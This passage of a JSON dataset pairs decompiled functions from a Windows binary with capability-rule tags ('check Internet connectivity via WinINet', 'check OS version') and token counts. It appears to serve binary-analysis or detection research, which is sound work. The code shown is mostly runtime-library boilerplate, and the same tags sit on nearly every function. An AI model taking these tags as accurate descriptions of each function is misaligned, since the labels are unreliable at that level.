   if (var_4h != '\\0') {\n                *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n            }\n        }\n        else {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 458
    },
    "004050ab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004050ab(int32_t arg_8h)\n\n{\n    char cVar1;\n    \n    if (arg_8h == 0) {\n        *0x56ec20 = 1;\n    }\n    fcn.004037ce();\n    cVar1 = fcn.00404b1a();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00404b79();\n        if (cVar1 != '\\0') {\n            return 1;\n        }\n        fcn.004011c7(0);\n    }\n    return 0;\n}\n",
        "token_count": 134
    },
    "0040515f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040515f(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 342
    },
    "00405182": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405182(code **param_1)\n\n{\n    *param_1 = vtable.std::ctype_wchar_t_.0;\n    if (param_1[4] != NULL) {\n        fcn.004040d9(param_1[3]);\n    }\n    fcn.004040d9(param_1[5]);\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 97
    },
    "004051be": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004051be(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    var_8h = 0;\n    var_4h = 0;\n    fcn.0040448a(0x26);\n    arg_8h_00 = fcn.00403deb(&var_10h);\n    fcn.00402eb9(arg_8h_00);\n    if (**0x56f458 == '@') {\n        *0x56f458 = *0x56f458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 255
    },
    "00405240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405240(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 == 0) {\n        fcn.004060f5(0);\n        if (*param_1 == 0) {\n            *0x56f210 = *0x56f210 + 1;\n            *param_1 = *0x56f210;\n        }\n        fcn.00403684();\n    }\n    return *param_1;\n}\n",
        "token_count": 113
    },
    "00405259": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405259(void)\n\n{\n    bool bVar1;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    float10 in_ST0;\n    \n    if (*0x570754 != 0) {\n        bVar1 = (in_MXCSR & 0x7f80) == 0x1f80;\n        if (bVar1) {\n            bVar1 = (in_FPUControlWord & 0x7f) == 0x7f;\n        }\n        if (bVar1) {\n            fcn.004dfd9e(SUB84(in_ST0, 0), in_ST0 >> 0x20);\n            return;\n        }\n    }\n    fcn.004033d2(SUB84(in_ST0, 0), in_ST0 >> 0x20);\n    fcn.004df078();\n    return;\n}\n",
        "token_count": 198
    },
    "00405277": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405277(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 342
    },
    "00405286": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405286(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX[8] == 0) || (piVar1 = in_ECX[0xc],  *piVar1 < 1)) {\n        pcVar3 = *(*in_ECX + 0xc);\n        (**0x573000)(arg_8h);\n        arg_8h = (*pcVar3)();\n    }\n    else {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *in_ECX[8];\n        *in_ECX[8] = puVar2 + 1;\n        *puVar2 = arg_8h;\n    }\n    return arg_8h & 0xffff;\n}\n",
        "token_count": 199
    },
    "004052e5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004052e5(uchar *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "0040531c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040531c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    \n    if (arg_8h != 0) {\n        LOCK();\n        *(arg_8h + 0xc) = *(arg_8h + 0xc) + -1;\n        piVar1 = *(arg_8h + 0x7c);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        piVar1 = *(arg_8h + 0x84);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        piVar1 = *(arg_8h + 0x80);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        piVar1 = *(arg_8h + 0x8c);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        ppiVar2 = arg_8h + 0x28;\n        iVar3 = 6;\n        do {\n            if ((ppiVar2[-2] != 0x56cf60) && (piVar1 = *ppiVar2,  piVar1 != NULL)) {\n                LOCK();\n                *piVar1 = *piVar1 + -1;\n            }\n            if ((ppiVar2[-3] != NULL) && (piVar1 = ppiVar2[-1],  piVar1 != NULL)) {\n                LOCK();\n                *piVar1 = *piVar1 + -1;\n            }\n            ppiVar2 = ppiVar2 + 4;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        fcn.00401348(*(arg_8h + 0x9c));\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "0040533f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040533f(uint16_t *arg_8h, uint16_t *arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    else {\n        fcn.004057e5(arg_10h);\n        if (*(var_ch + 0xa8) == 0) {\n            iVar3 = fcn.00402fea(arg_8h, arg_ch);\n        }\n        else {\n            do {\n                uVar4 = fcn.00403616(*arg_8h, &var_ch);\n                uVar1 = *arg_ch;\n                arg_8h = arg_8h + 1;\n                arg_ch = arg_ch + 1;\n                uVar5 = fcn.00403616(uVar1, &var_ch);\n                iVar3 = (uVar4 & 0xffff) - (uVar5 & 0xffff);\n                if (iVar3 != 0) break;\n            } while ((uVar4 & 0xffff) != 0);\n        }\n        if (var_4h != '\\0') {\n            *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 452
    },
    "00405349": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405349(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 341
    },
    "00405367": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405367(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint lpName;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    uVar3 = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    lpName = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch._0_1_ = '\\0';\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    var_4h._0_1_ = '\\0';\n    arg_10h = fcn.00403b0c();\n    iVar1 = fcn.00404e62(arg_8h, &var_30h, arg_10h);\n    if (iVar1 == 0) {\n        uVar3 = fcn.00403b0c();\n        iVar1 = fcn.00404e62(arg_ch, &var_18h, uVar3);\n        uVar3 = var_10h;\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(lpName, var_10h);\n        }\n    }\n    if (var_4h != '\\0') {\n        fcn.00406302(uVar3);\n    }\n    if (var_1ch != '\\0') {\n        fcn.00406302(lpName);\n    }\n    return uVar2;\n}\n",
        "token_count": 464
    },
    "004053d5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid __cdecl fcn.004053d5(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    uint *var_2ch;\n    char *var_24h;\n    uint *var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if (**0x56f458 == 'X') {\n        *0x56f458 = *0x56f458 + 1;\n        var_24h = \"void\";\n        var_20h = 0x4;\n        fcn.00402cfc(&fcn.004053d5::var_24h);\n    }\n    else if (**0x56f458 == '?') {\n        fcn.0040622b(&fcn.004053d5::var_24h);\n        if (((*0x56f460 & 0x4000) != 0) && (*0x56f468 != NULL)) {\n            fcn.00403daa(&fcn.004053d5::var_14h, 0x10);\n            pcVar1 = *0x56f468;\n            uVar2 = fcn.00406681(&fcn.004053d5::var_14h);\n            (**0x573000)(uVar2);\n            arg_8h_00 = (*pcVar1)();\n            if (arg_8h_00 != 0) {\n                var_20h = var_20h & 0xffffff00;\n                var_2ch = var_20h;\n                fcn.00404c46(arg_8h_00);\n                goto code_r0x00490632;\n            }\n        }\n        var_20h = &fcn.004053d5::var_1ch;\n        var_1ch = \"`template-parameter\";\n        var_18h = 0x13;\n        var_24h = 0x490602;\n        fcn.00402cfc(var_20h);\n        var_24h = &fcn.004053d5::var_24h;\n        fcn.004052f9(&fcn.004053d5::var_1ch, var_24h);\n        var_2ch = 0x27;\n        fcn.004032bf(arg_8h, 0x27);\n    }\n    else {\n        var_1ch = NULL;\n        var_18h = 0;\n        fcn.00403625(arg_8h, &fcn.004053d5::var_1ch);\n    }\ncode_r0x00490632:\n    fcn.00403085(var_2ch);\n    return;\n}\n",
        "token_count": 671
    },
    "004053da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004053da(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    uint32_t uVar2;\n    \n    if (arg_ch == 0) {\n        return;\n    }\n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\ncode_r0x004a7930:\n            *arg_10h = -1;\n            return;\n        }\n    }\n    else {\n        uVar2 = piVar1[1] - piVar1[2];\n        if (arg_ch <= uVar2) {\n            uVar2 = arg_ch;\n        }\n        fcn.0040576d(*piVar1, arg_8h, uVar2);\n        **in_ECX = **in_ECX + uVar2;\n        (*in_ECX)[2] = (*in_ECX)[2] + uVar2;\n        if (*(*in_ECX + 3) == '\\0') {\n            if (uVar2 == arg_ch) {\n                *arg_10h = *arg_10h + uVar2;\n                return;\n            }\n            goto code_r0x004a7930;\n        }\n    }\n    *arg_10h = *arg_10h + arg_ch;\n    return;\n}\n",
        "token_count": 326
    },
    "004053e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __cdecl\nfcn.004053e4(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint arg_8h)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code **ppcVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_1ch;\n    uint arg_8h_00;\n    uint var_5ch;\n    uint32_t var_28h;\n    uint var_24h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &fcn.004053e4::var_5ch;\n    var_10h = 0xffffffff;\n    var_14h = 0x41e3f0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004053e4::var_18h;\n    arg_8h_00 = 0x41996a;\n    fcn.004060f5(0);\n    ppcVar1 = *0x56ebcc;\n    if (*0x56ebc0 == 0) {\n        arg_8h_00 = 0;\n        fcn.004060f5(0);\n        if (*0x56ebc0 == 0) {\n            *0x56ebc0 = *0x56f210 + 1;\n            *0x56f210 = *0x56ebc0;\n        }\n        fcn.00403684();\n    }\n    iVar2 = *(var_8h + 4);\n    if ((*(iVar2 + 0xc) < *0x56ebc0 || *(iVar2 + 0xc) == *0x56ebc0) ||\n       (ppcVar4 = *(*(iVar2 + 8) + *0x56ebc0 * 4),  ppcVar4 == NULL)) {\n        if (*(iVar2 + 0x14) != '\\0') {\n            var_28h = *0x56ebc0;\n            var_20h = ppcVar1;\n            var_10h = 0;\n            iVar2 = fcn.00404ee4();\n            ppcVar1 = var_20h;\n            if ((var_28h <= *(iVar2 + 0xc) && *(iVar2 + 0xc) != var_28h) &&\n               (ppcVar4 = *(*(iVar2 + 8) + var_28h * 4),  ppcVar4 != NULL)) goto code_r0x00419a74;\n        }\n        ppcVar4 = ppcVar1;\n        if (ppcVar4 == NULL) {\n            var_10h = 0;\n            var_20h = fcn.004024b9(8, arg_8h_00);\n            iVar2 = *(var_8h + 4);\n            if (iVar2 == 0) {\n                iVar3 = 0x54018f;\n            }\n            else {\n                iVar3 = iVar2 + 0x1c;\n                if (*(iVar2 + 0x18) != 0) {\n                    iVar3 = *(iVar2 + 0x18);\n                }\n            }\n            var_10h = 1;\n            fcn.0040465b(iVar3);\n            ppcVar1 = var_20h;\n            var_20h[1] = NULL;\n            *var_20h = vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            fcn.00401fb4();\n            var_10h = 2;\n            fcn.0040238d(ppcVar1);\n            ppcVar4 = var_20h;\n            (**(*var_20h + 4))();\n            *0x56ebcc = ppcVar4;\n        }\n    }\ncode_r0x00419a74:\n    fcn.00403684();\n    *in_FS_OFFSET = var_18h;\n    return ppcVar4;\n}\n",
        "token_count": 1056
    },
    "004053f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004053f3(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 84
    },
    "00405443": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405443(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uchar *puVar5;\n    uint uVar6;\n    int32_t **in_FS_OFFSET;\n    code *apcStack64 [5];\n    uint uStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    code **ppcStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppcStack32 = apcStack64;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e3e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    iVar2 = *(*param_1 + 4);\n    puVar5 = &stack0xfffffffc;\n    if ((*(param_1 + iVar2 + 0xc) == 0) && (puVar5 = &stack0xfffffffc,  (*(param_1 + iVar2 + 0x14) & 2) != 0)) {\n        uStack20 = 0;\n        piStack36 = param_1;\n        iVar2 = (**(**(param_1 + iVar2 + 0x38) + 0x34))();\n        puVar5 = &stack0xfffffffc;\n        if (iVar2 == -1) {\n            iVar2 = *(*piStack36 + 4);\n            uVar3 = *(piStack36 + iVar2 + 0xc) & 0x13 | 4;\n            *(piStack36 + iVar2 + 0xc) = uVar3;\n            uVar1 = *(piStack36 + iVar2 + 0x10);\n            uVar3 = uVar3 & uVar1;\n            puVar5 = &stack0xfffffffc;\n            if (uVar3 != 0) {\n                uVar4 = 0x5416b6;\n                if ((uVar3 & 2) == 0) {\n                    uVar4 = 0x5416d0;\n                }\n                uVar6 = 0x54169d;\n                if ((uVar1 & 4) == 0) {\n                    uVar6 = uVar4;\n                }\n                fcn.00404372(&uStack44, 1);\n                fcn.00405ed4(uStack44, uStack40, uVar6);\n                apcStack64[0] = vtable.std::ios_base::failure.0;\n                fcn.004066d1(apcStack64, 0x560cfc);\n                puVar5 = &stack0x00000008;\n            }\n        }\n    }\n    *in_FS_OFFSET = *(puVar5 + -0x18);\n    return;\n}\n",
        "token_count": 631
    },
    "004182c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.004182c0(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e2e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 254
    },
    "00405452": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405452(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049dd88;\n            param_1[7] = 8;\ncode_r0x0049dc53:\n            puStack8 = 0x49dc58;\n            puVar6 = fcn.004039a4();\n            *puVar6 = 0x16;\n            puStack8 = 0x49dc63;\n            uVar7 = fcn.00403751();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049dc53;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049dd88;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049dd88;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049dd88;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049dd88;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049dd88;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049dd88;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049dd88:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049dd88;\n    param_1[7] = 7;\n    puStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) 